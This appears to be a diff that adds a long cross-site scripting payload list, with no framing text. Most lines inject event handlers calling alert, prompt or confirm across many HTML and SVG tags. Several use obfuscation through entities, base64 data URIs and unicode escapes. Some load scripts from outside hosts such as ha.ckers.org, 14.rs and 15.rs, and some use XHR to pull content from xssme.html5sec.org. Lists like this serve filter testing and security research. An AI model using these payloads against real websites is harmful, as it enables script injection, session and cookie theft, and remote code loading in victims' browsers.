+<style>@keyframes x{}</style><button style=\"animation-name:x\" onanimationend=\"alert(1)\"></button>
+<style>@keyframes x{}</style><cite style=\"animation-name:x\" onanimationend=\"alert(1)\"></cite>
+<style>@keyframes x{}</style><cite style=\"animation-name:x\" onanimationstart=\"alert(1)\"></cite>
+<style>@keyframes x{}</style><code style=\"animation-name:x\" onanimationend=\"alert(1)\"></code>
+<style>@keyframes x{}</style><code style=\"animation-name:x\" onanimationstart=\"alert(1)\"></code>
+<style>@keyframes x{}</style><col style=\"animation-name:x\" onanimationend=\"alert(1)\"></col>
+<style>@keyframes x{}</style><col style=\"animation-name:x\" onanimationstart=\"alert(1)\"></col>
+<style>@keyframes x{}</style><colgroup style=\"animation-name:x\" onanimationend=\"alert(1)\"></colgroup>
+<style>@keyframes x{}</style><colgroup style=\"animation-name:x\" onanimationstart=\"alert(1)\"></colgroup>
+<style>@keyframes x{}</style><command style=\"animation-name:x\" onanimationend=\"alert(1)\"></command>
+<style>@keyframes x{}</style><command style=\"animation-name:x\" onanimationstart=\"alert(1)\"></command>
+<style>@keyframes x{}</style><content style=\"animation-name:x\" onanimationend=\"alert(1)\"></content>
+<style>@keyframes x{}</style><content style=\"animation-name:x\" onanimationstart=\"alert(1)\"></content>
+<style>@keyframes x{}</style><data style=\"animation-name:x\" onanimationend=\"alert(1)\"></data>
+<style>@keyframes x{}</style><data style=\"animation-name:x\" onanimationstart=\"alert(1)\"></data>
+<style>@keyframes x{}</style><datalist style=\"animation-name:x\" onanimationend=\"alert(1)\"></datalist>
+<style>@keyframes x{}</style><datalist style=\"animation-name:x\" onanimationstart=\"alert(1)\"></datalist>
+<style>@keyframes x{}</style><dd style=\"animation-name:x\" onanimationend=\"alert(1)\"></dd>
+<style>@keyframes x{}</style><dd style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dd>
+<style>@keyframes x{}</style><del style=\"animation-name:x\" onanimationend=\"alert(1)\"></del>
+<style>@keyframes x{}</style><dfn style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dfn>
+<style>@keyframes x{}</style><dialog style=\"animation-name:x\" onanimationend=\"alert(1)\"></dialog>
+<style>@keyframes x{}</style><fieldset style=\"animation-name:x\" onanimationstart=\"alert(1)\"></fieldset>
+<style>@keyframes x{}</style><footer style=\"animation-name:x\" onanimationend=\"alert(1)\"></footer>
+<style>@keyframes x{}</style><form style=\"animation-name:x\" onanimationstart=\"alert(1)\"></form>
+<style>@keyframes x{}</style><frameset style=\"animation-name:x\" onanimationend=\"alert(1)\"></frameset>
+<style>@keyframes x{}</style><html style=\"animation-name:x\" onanimationend=\"alert(1)\"></html>
+<style>@keyframes x{}</style><i style=\"animation-name:x\" onanimationstart=\"alert(1)\"></i>
+<style>@keyframes x{}</style><iframe style=\"animation-name:x\" onanimationend=\"alert(1)\"></iframe>
+<style>@keyframes x{}</style><image style=\"animation-name:x\" onanimationend=\"alert(1)\"></image>
+<style>@keyframes x{}</style><mark style=\"animation-name:x\" onanimationend=\"alert(1)\"></mark>
+<style>@keyframes x{}</style><mark style=\"animation-name:x\" onanimationstart=\"alert(1)\"></mark>
+<style>@keyframes x{}</style><marquee style=\"animation-name:x\" onanimationend=\"alert(1)\"></marquee>
+<style>@keyframes x{}</style><marquee style=\"animation-name:x\" onanimationstart=\"alert(1)\"></marquee>
+<style>@keyframes x{}</style><meta style=\"animation-name:x\" onanimationstart=\"alert(1)\"></meta>
+<style>@keyframes x{}</style><meter style=\"animation-name:x\" onanimationend=\"alert(1)\"></meter>
+<style>@keyframes x{}</style><multicol style=\"animation-name:x\" onanimationstart=\"alert(1)\"></multicol>
+<style>@keyframes x{}</style><noembed style=\"animation-name:x\" onanimationstart=\"alert(1)\"></noembed>
+<style>@keyframes x{}</style><noframes style=\"animation-name:x\" onanimationend=\"alert(1)\"></noframes>
+<style>@keyframes x{}</style><noframes style=\"animation-name:x\" onanimationstart=\"alert(1)\"></noframes>
+<style>@keyframes x{}</style><nosciPt style=\"animation-name:x\" onanimationend=\"alert(1)\"></nosciPt>
+<style>@keyframes x{}</style><nosciPt style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nosciPt>
+<style>@keyframes x{}</style><object style=\"animation-name:x\" onanimationend=\"alert(1)\"></object>
+<style>@keyframes x{}</style><object style=\"animation-name:x\" onanimationstart=\"alert(1)\"></object>
+<style>@keyframes x{}</style><ol style=\"animation-name:x\" onanimationend=\"alert(1)\"></ol>
+<style>@keyframes x{}</style><ol style=\"animation-name:x\" onanimationstart=\"alert(1)\"></ol>
+<style>@keyframes x{}</style><optgroup style=\"animation-name:x\" onanimationend=\"alert(1)\"></optgroup>
+<style>@keyframes x{}</style><optgroup style=\"animation-name:x\" onanimationstart=\"alert(1)\"></optgroup>
+<style>@keyframes x{}</style><option style=\"animation-name:x\" onanimationend=\"alert(1)\"></option>
+<style>@keyframes x{}</style><option style=\"animation-name:x\" onanimationstart=\"alert(1)\"></option>
+<style>@keyframes x{}</style><output style=\"animation-name:x\" onanimationend=\"alert(1)\"></output>
+<style>@keyframes x{}</style><output style=\"animation-name:x\" onanimationstart=\"alert(1)\"></output>
+<style>@keyframes x{}</style><p style=\"animation-name:x\" onanimationend=\"alert(1)\"></p>
+<style>@keyframes x{}</style><p style=\"animation-name:x\" onanimationstart=\"alert(1)\"></p>
+<style>@keyframes x{}</style><param style=\"animation-name:x\" onanimationend=\"alert(1)\"></param>
+<style>@keyframes x{}</style><param style=\"animation-name:x\" onanimationstart=\"alert(1)\"></param>
+<style>@keyframes x{}</style><picture style=\"animation-name:x\" onanimationend=\"alert(1)\"></picture>
+<style>@keyframes x{}</style><picture style=\"animation-name:x\" onanimationstart=\"alert(1)\"></picture>
+<style>@keyframes x{}</style><progress style=\"animation-name:x\" onanimationend=\"alert(1)\"></progress>
+<style>@keyframes x{}</style><rt style=\"animation-name:x\" onanimationstart=\"alert(1)\"></rt>
+<style>@keyframes x{}</style><ruby style=\"animation-name:x\" onanimationend=\"alert(1)\"></ruby>
+<style>@keyframes x{}</style><s style=\"animation-name:x\" onanimationstart=\"alert(1)\"></s>
+<style>@keyframes x{}</style><select style=\"animation-name:x\" onanimationend=\"alert(1)\"></select>
+<style>@keyframes x{}</style><shadow style=\"animation-name:x\" onanimationend=\"alert(1)\"></shadow>
+<style>@keyframes x{}</style><slot style=\"animation-name:x\" onanimationend=\"alert(1)\"></slot>
+<style>@keyframes x{}</style><span style=\"animation-name:x\" onanimationstart=\"alert(1)\"></span>
+<style>@keyframes x{}</style><sup style=\"animation-name:x\" onanimationstart=\"alert(1)\"></sup>
+<style>@keyframes x{}</style><tr style=\"animation-name:x\" onanimationend=\"alert(1)\"></tr>
+<style>@keyframes x{}</style><u style=\"animation-name:x\" onanimationend=\"alert(1)\"></u>
+<style>@keyframes x{}</style><u style=\"animation-name:x\" onanimationstart=\"alert(1)\"></u>
+<style>@keyframes x{}</style><ul style=\"animation-name:x\" onanimationend=\"alert(1)\"></ul>
+<style>@keyframes x{}</style><var style=\"animation-name:x\" onanimationend=\"alert(1)\"></var>
+<style>@keyframes x{}</style><video style=\"animation-name:x\" onanimationend=\"alert(1)\"></video>
+<style>@keyframes x{}</style><xmp style=\"animation-name:x\" onanimationend=\"alert(1)\"></xmp>
+<style>@keyframes x{}</style><xmp style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xmp>
+<sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>
+<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>
+<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>
+<sub id=x tabindex=1 onfocus=alert(1)></sub>
+<sub id=x tabindex=1 onfocusin=alert(1)></sub>
+<sub onbeforecopy=\"alert(1)\" contenteditable>test</sub>
+<sub onbeforecut=\"alert(1)\" contenteditable>test</sub>
+<sub onbeforepaste=\"alert(1)\" contenteditable>test</sub>
+<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>
+<sub onclick=\"alert(1)\">test</sub>
+<sub oncontextmenu=\"alert(1)\">test</sub>
+<sub oncopy=\"alert(1)\" contenteditable>test</sub>
+<sub oncut=\"alert(1)\" contenteditable>test</sub>
+<sub ondblclick=\"alert(1)\">test</sub>
+<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>
+<sub onkeydown=\"alert(1)\" contenteditable>test</sub>
+<sub onkeypress=\"alert(1)\" contenteditable>test</sub>
+<sub onmousedown=\"alert(1)\">test</sub>
+<sub onmouseout=\"alert(1)\">test</sub>
+<sub onpaste=\"alert(1)\" contenteditable>test</sub>
+<summary draggable=\"true\" ondragleave=\"alert(1)\">test</summary>
+<summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>
+<summary onbeforecut=\"alert(1)\" contenteditable>test</summary>
+<summary onbeforepaste=\"alert(1)\" contenteditable>test</summary>
+<summary ondblclick=\"alert(1)\">test</summary>
+<summary onkeyup=\"alert(1)\" contenteditable>test</summary>
+<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>
+<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>
+<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>
+<svg onbeforecopy=\"alert(1)\" contenteditable>test</svg>
+<svg onbeforecut=\"alert(1)\" contenteditable>test</svg>
+<svg onbeforepaste=\"alert(1)\" contenteditable>test</svg>
+<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>
+<svg oncontextmenu=\"alert(1)\">test</svg>
+<svg ondblclick=\"alert(1)\">test</svg>
+<svg onmouseleave=\"alert(1)\">test</svg>
+<svg onmouseup=\"alert(1)\">test</svg>
+<svg onpaste=\"alert(1)\" contenteditable>test</svg>
+<svg onunload=window.open('javasciPt:alert(1)')>
+<svg><a onload=alert(1)></a>
+<svg><abbr onload=alert(1)></abbr>
+<svg><acronym onload=alert(1)></acronym>
+<svg><address onload=alert(1)></address>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>
+<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>
+<svg><applet onload=alert(1)></applet>
+<svg><area onload=alert(1)></area>
+<svg><article onload=alert(1)></article>
+<svg><aside onload=alert(1)></aside>
+<svg><audio onload=alert(1)></audio>
+<svg><base onload=alert(1)></base>
+<svg><bdi onload=alert(1)></bdi>
+<svg><bgsound onload=alert(1)></bgsound>
+<svg><blink onload=alert(1)></blink>
+<svg><cite onload=alert(1)></cite>
+<svg><col onload=alert(1)></col>
+<svg><data onload=alert(1)></data>
+<svg><element onload=alert(1)></element>
+<svg><noembed onload=alert(1)></noembed>
+<svg><option onload=alert(1)></option>
+<svg><plaintext onload=alert(1)></plaintext>
+<svg><pre onload=alert(1)></pre>
+<svg><progress onload=alert(1)></progress>
+<svg><q onload=alert(1)></q>
+<svg><rb onload=alert(1)></rb>
+<svg><rp onload=alert(1)></rp>
+<svg><rtc onload=alert(1)></rtc>
+<svg><set onbegin=alert(1) attributename=x dur=1s>
+<svg><set onend=alert(1) attributename=x dur=1s>
+<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
+<svg><span onload=alert(1)></span>
+<svg><strike onload=alert(1)></strike>
+<svg><strong onload=alert(1)></strong>
+<svg><sub onload=alert(1)></sub>
+<svg><summary onload=alert(1)></summary>
+<svg><sup onload=alert(1)></sup>
+<svg><table onload=alert(1)></table>
+<svg><tbody onload=alert(1)></tbody>
+<svg><td onload=alert(1)></td>
+<svg><template onload=alert(1)></template>
+<svg><textarea onload=alert(1)></textarea>
+<svg><tfoot onload=alert(1)></tfoot>
+<svg><th onload=alert(1)></th>
+<svg><thead onload=alert(1)></thead>
+<svg><time onload=alert(1)></time>
+<svg><title onload=alert(1)></title>
+<svg><tr onload=alert(1)></tr>
+<svg><tt onload=alert(1)></tt>
+<svg><u onload=alert(1)></u>
+<svg><ul onload=alert(1)></ul>
+<svg><var onload=alert(1)></var>
+<svg><xss onload=alert(1)></xss>
+<table draggable=\"true\" ondragleave=\"alert(1)\">test</table>
+<table draggable=\"true\" ondragstart=\"alert(1)\">test</table>
+<table oncontextmenu=\"alert(1)\">test</table>
+<table onmouseup=\"alert(1)\">test</table>
+<tbody onmouseover=\"alert(1)\">test</tbody>
+<td draggable=\"true\" ondragenter=\"alert(1)\">test</td>
+<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>
+<td onbeforecopy=\"alert(1)\" contenteditable>test</td>
+<td onbeforecut=\"alert(1)\" contenteditable>test</td>
+<td onbeforepaste=\"alert(1)\" contenteditable>test</td>
+<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>
+<td onclick=\"alert(1)\">test</td>
+<td oncopy=\"alert(1)\" contenteditable>test</td>
+<td oncut=\"alert(1)\" contenteditable>test</td>
+<td ondblclick=\"alert(1)\">test</td>
+<td onkeyup=\"alert(1)\" contenteditable>test</td>
+<td onmousemove=\"alert(1)\">test</td>
+<td onpaste=\"alert(1)\" contenteditable>test</td>
+<template draggable=\"true\" ondragend=\"alert(1)\">test</template>
+<template draggable=\"true\" ondragenter=\"alert(1)\">test</template>
+<template draggable=\"true\" ondragleave=\"alert(1)\">test</template>
+<template draggable=\"true\" ondragstart=\"alert(1)\">test</template>
+<template id=x tabindex=1 onactivate=alert(1)></template>
+<template id=x tabindex=1 onbeforeactivate=alert(1)></template>
+<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>
+<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>
+<template id=x tabindex=1 onfocus=alert(1)></template>
+<template id=x tabindex=1 onfocusin=alert(1)></template>
+<template onbeforecopy=\"alert(1)\" contenteditable>test</template>
+<template onbeforecut=\"alert(1)\" contenteditable>test</template>
+<template onbeforepaste=\"alert(1)\" contenteditable>test</template>
+<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>
+<template onclick=\"alert(1)\">test</template>
+<template oncontextmenu=\"alert(1)\">test</template>
+<template oncopy=\"alert(1)\" contenteditable>test</template>
+<template oncut=\"alert(1)\" contenteditable>test</template>
+<template ondblclick=\"alert(1)\">test</template>
+<textarea draggable=\"true\" ondragleave=\"alert(1)\">test</textarea>
+<textarea oncopy=alert(1) autofocus>XSS</textarea>
+<tfoot draggable=\"true\" ondragleave=\"alert(1)\">test</tfoot>
+<tfoot oncopy=\"alert(1)\" contenteditable>test</tfoot>
+<tfoot oncut=\"alert(1)\" contenteditable>test</tfoot>
+<tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>
+<tfoot onkeydown=\"alert(1)\" contenteditable>test</tfoot>
+<tfoot onpaste=\"alert(1)\" contenteditable>test</tfoot>
+<th draggable=\"true\" ondragend=\"alert(1)\">test</th>
+<th draggable=\"true\" ondragenter=\"alert(1)\">test</th>
+<th draggable=\"true\" ondragleave=\"alert(1)\">test</th>
+<th id=x tabindex=1 onactivate=alert(1)></th>
+<th id=x tabindex=1 onbeforeactivate=alert(1)></th>
+<th id=x tabindex=1 onfocus=alert(1)></th>
+<th id=x tabindex=1 onfocusin=alert(1)></th>
+<th onbeforecopy=\"alert(1)\" contenteditable>test</th>
+<th ondblclick=\"alert(1)\">test</th>
+<th onkeypress=\"alert(1)\" contenteditable>test</th>
+<th onkeyup=\"alert(1)\" contenteditable>test</th>
+<th onmousedown=\"alert(1)\">test</th>
+<th onmouseenter=\"alert(1)\">test</th>
+<th onmouseleave=\"alert(1)\">test</th>
+<th onmousemove=\"alert(1)\">test</th>
+<th onmouseout=\"alert(1)\">test</th>
+<th onmouseover=\"alert(1)\">test</th>
+<th onmouseup=\"alert(1)\">test</th>
+<th onpaste=\"alert(1)\" contenteditable>test</th>
+<thead draggable=\"true\" ondrag=\"alert(1)\">test</thead>
+<thead draggable=\"true\" ondragend=\"alert(1)\">test</thead>
+<thead draggable=\"true\" ondragenter=\"alert(1)\">test</thead>
+<thead draggable=\"true\" ondragleave=\"alert(1)\">test</thead>
+<thead draggable=\"true\" ondragstart=\"alert(1)\">test</thead>
+<thead id=x tabindex=1 onactivate=alert(1)></thead>
+<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>
+<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>
+<thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>
+<thead id=x tabindex=1 onfocus=alert(1)></thead>
+<thead onbeforecut=\"alert(1)\" contenteditable>test</thead>
+<time draggable=\"true\" ondragend=\"alert(1)\">test</time>
+<time oncontextmenu=\"alert(1)\">test</time>
+<time onmousemove=\"alert(1)\">test</time>
+<title draggable=\"true\" ondragend=\"alert(1)\">test</title>
+<title draggable=\"true\" ondragleave=\"alert(1)\">test</title>
+<title id=x tabindex=1 onactivate=alert(1)></title>
+<title id=x tabindex=1 onbeforeactivate=alert(1)></title>
+<title oncontextmenu=\"alert(1)\">test</title>
+<title onmousemove=\"alert(1)\">test</title>
+<title onmouseout=\"alert(1)\">test</title>
+<title onmouseup=\"alert(1)\">test</title>
+<title onpaste=\"alert(1)\" contenteditable>test</title>
+<tr draggable=\"true\" ondrag=\"alert(1)\">test</tr>
+<tr draggable=\"true\" ondragend=\"alert(1)\">test</tr>
+<tr draggable=\"true\" ondragleave=\"alert(1)\">test</tr>
+<tr oncontextmenu=\"alert(1)\">test</tr>
+<tr oncopy=\"alert(1)\" contenteditable>test</tr>
+<tr oncut=\"alert(1)\" contenteditable>test</tr>
+<tr ondblclick=\"alert(1)\">test</tr>
+<tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>
+<tr onkeydown=\"alert(1)\" contenteditable>test</tr>
+<tr onkeypress=\"alert(1)\" contenteditable>test</tr>
+<tr onkeyup=\"alert(1)\" contenteditable>test</tr>
+<tr onmousedown=\"alert(1)\">test</tr>
+<tr onmouseenter=\"alert(1)\">test</tr>
+<tr onmouseleave=\"alert(1)\">test</tr>
+<tr onmousemove=\"alert(1)\">test</tr>
+<tr onmouseout=\"alert(1)\">test</tr>
+<tr onmouseover=\"alert(1)\">test</tr>
+<tr onmouseup=\"alert(1)\">test</tr>
+<tr onpaste=\"alert(1)\" contenteditable>test</tr>
+<track draggable=\"true\" ondrag=\"alert(1)\">test</track>
+<track draggable=\"true\" ondragend=\"alert(1)\">test</track>
+<track draggable=\"true\" ondragenter=\"alert(1)\">test</track>
+<track draggable=\"true\" ondragleave=\"alert(1)\">test</track>
+<track draggable=\"true\" ondragstart=\"alert(1)\">test</track>
+<track ondblclick=\"alert(1)\">test</track>
+<track onmouseup=\"alert(1)\">test</track>
+<tt onbeforepaste=\"alert(1)\" contenteditable>test</tt>
+<tt onclick=\"alert(1)\">test</tt>
+<tt oncut=\"alert(1)\" contenteditable>test</tt>
+<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>
+<tt onkeypress=\"alert(1)\" contenteditable>test</tt>
+<u draggable=\"true\" ondragenter=\"alert(1)\">test</u>
+<u ondblclick=\"alert(1)\">test</u>
+<u onkeydown=\"alert(1)\" contenteditable>test</u>
+<u onkeypress=\"alert(1)\" contenteditable>test</u>
+<u onkeyup=\"alert(1)\" contenteditable>test</u>
+<u onmousedown=\"alert(1)\">test</u>
+<u onmouseenter=\"alert(1)\">test</u>
+<u onmouseleave=\"alert(1)\">test</u>
+<ul draggable=\"true\" ondrag=\"alert(1)\">test</ul>
+<ul id=x tabindex=1 onfocusin=alert(1)></ul>
+<ul onbeforecopy=\"alert(1)\" contenteditable>test</ul>
+<ul onbeforecut=\"alert(1)\" contenteditable>test</ul>
+<ul onbeforepaste=\"alert(1)\" contenteditable>test</ul>
+<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>
+<ul onclick=\"alert(1)\">test</ul>
+<ul oncontextmenu=\"alert(1)\">test</ul>
+<ul oncopy=\"alert(1)\" contenteditable>test</ul>
+<ul oncut=\"alert(1)\" contenteditable>test</ul>
+<ul ondblclick=\"alert(1)\">test</ul>
+<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>
+<ul onkeydown=\"alert(1)\" contenteditable>test</ul>
+<ul onkeypress=\"alert(1)\" contenteditable>test</ul>
+<ul onkeyup=\"alert(1)\" contenteditable>test</ul>
+<ul onmousedown=\"alert(1)\">test</ul>
+<ul onmouseenter=\"alert(1)\">test</ul>
+<ul onmouseleave=\"alert(1)\">test</ul>
+<ul onmousemove=\"alert(1)\">test</ul>
+<ul onmouseout=\"alert(1)\">test</ul>
+<ul onmouseup=\"alert(1)\">test</ul>
+<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>
+<var onmousedown=\"alert(1)\">test</var>
+<var onmouseleave=\"alert(1)\">test</var>
+<var onmouseover=\"alert(1)\">test</var>
+<var onpaste=\"alert(1)\" contenteditable>test</var>
+<video autoplay controls onseeking=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>
+<video autoplay onloadedmetadata=alert(1)> <source src=\"validvideo.mp4\" type=\"video/mp4\"></video>
+<video onbeforecopy=\"alert(1)\" contenteditable>test</video>
+<video onkeypress=\"alert(1)\" contenteditable>test</video>
+<video onmouseout=\"alert(1)\">test</video>
+<video><source onerror=alert(1) src=1></video>
+<wbr draggable=\"true\" ondrag=\"alert(1)\">test</wbr>
+<wbr draggable=\"true\" ondragend=\"alert(1)\">test</wbr>
+<wbr draggable=\"true\" ondragenter=\"alert(1)\">test</wbr>
+<wbr draggable=\"true\" ondragleave=\"alert(1)\">test</wbr>
+<wbr draggable=\"true\" ondragstart=\"alert(1)\">test</wbr>
+<wbr ondblclick=\"alert(1)\">test</wbr>
+<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>
+<wbr onkeydown=\"alert(1)\" contenteditable>test</wbr>
+<wbr onkeypress=\"alert(1)\" contenteditable>test</wbr>
+<wbr onkeyup=\"alert(1)\" contenteditable>test</wbr>
+<wbr onmousedown=\"alert(1)\">test</wbr>
+<wbr onmouseenter=\"alert(1)\">test</wbr>
+<wbr onmouseleave=\"alert(1)\">test</wbr>
+<wbr onmousemove=\"alert(1)\">test</wbr>
+<wbr onmouseout=\"alert(1)\">test</wbr>
+<wbr onmouseover=\"alert(1)\">test</wbr>
+<wbr onmouseup=\"alert(1)\">test</wbr>
+<wbr onpaste=\"alert(1)\" contenteditable>test</wbr>
+<xmp draggable=\"true\" ondrag=\"alert(1)\">test</xmp>
+<xmp draggable=\"true\" ondragend=\"alert(1)\">test</xmp>
+<xmp draggable=\"true\" ondragenter=\"alert(1)\">test</xmp>
+<xmp draggable=\"true\" ondragstart=\"alert(1)\">test</xmp>
+<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>
+<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>
+<xmp onbeforecopy=\"alert(1)\" contenteditable>test</xmp>
+<xmp onbeforecut=\"alert(1)\" contenteditable>test</xmp>
+<xmp onmouseleave=\"alert(1)\">test</xmp>
+<xmp onmouseup=\"alert(1)\">test</xmp>
+<xss id=x tabindex=1 onfocusin=alert(1)></xss>
+<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
+<sciPt>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match( ...
+<sciPt for=document event=onreadystatechange>getElementById('safe123').click()</sciPt>
+<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdG ...
+<sciPt>function x(window) { eval(location.hash.substr(1)) }; open(%22javasciPt:opener.x(window)%22)</sciPt>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2' ...
+%3CsciPt%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%2 ...
+<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%2 ...
+<a target=\"x\" href=\"xssme?xss=%3CsciPt%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/sciPt%3E%3Ciframe%20src=%22data:text/html, ...
+<a target=\"x\" href=\"xssme?xss=<sciPt>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101) ...
+<a target=\"x\" href=\"xssme?xss=<sciPt>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe. ...
+Garethy Salty Method!<sciPt>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0] ...
+<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>
+<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"> ?
+<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">
+<sciPt src=\"data:text/javasciPt,alert(1)\"></sciPt>
+<iframe/onreadystatechange=alert(1)
+<svg/onload=alert(1)
+<input value=<><iframe/src=javasciPt:confirm(1)
+<input type=\"text\" value=``<div/onmouseover='alert(1)'>X</div>
+http://www.<sciPt>alert(1)</sciPt .com
+<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Ta ...
+<svg><sciPt ?>alert(1)
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<img src=`xx:xx`onerror=alert(1)>
+<object type=\"text/x-sciPtlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javasciPt&colon;alert(1)\"/>?
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click
+<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowsciPtaccess=always>?
+<svg contentScriptType=text/vbs><sciPt>MsgBox+1
+<a href=\"data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>\">X</a
+<sciPt>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</sciPt U+
+<sciPt/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></sciPt ????????????
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<div/onmouseover='alert(1)'> style=\"x:\">
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
+<a  href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#10 ...
+SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=\" &#14;  javasciPt:alert('XSS');\">
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<DIV STYLE=\"width: expression(alert('XSS'));\">
+a=\"get\";
+<XML SRC=\"http://ha.ckers.org/xsstest.xml\" ID=I></XML>
+<HTML><BODY>
+<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>
+<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'\"-->
+<? echo('<SCR)';
+<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\">
+<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>
+<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>
+<sCrIpt/\"<a\"/srC=data:=\".<a,[8].some(confirm)>
+<--`<iMG/srC=` onerror=confirm``> --!>
+<SVg </onlOad =\"1> (_=prompt,_(1)) \"\">
+<!--><scRipT src=//14.rs>
+<sCriPt/src=//14.rs?
+<sCRIpt x=\">\" src=//15.rs></sciPt>
+<D3/OnMouSEenTer=[2].find(confirm)>z
+<D3\"<\"/OncLick=\"1>[confirm``]\"<\">z
+<D3/OnpOinTeReENter=confirm``>click here
+<Z oncut=alert()>x
+<iFrAMe/src \/\/onload = prompt(1)
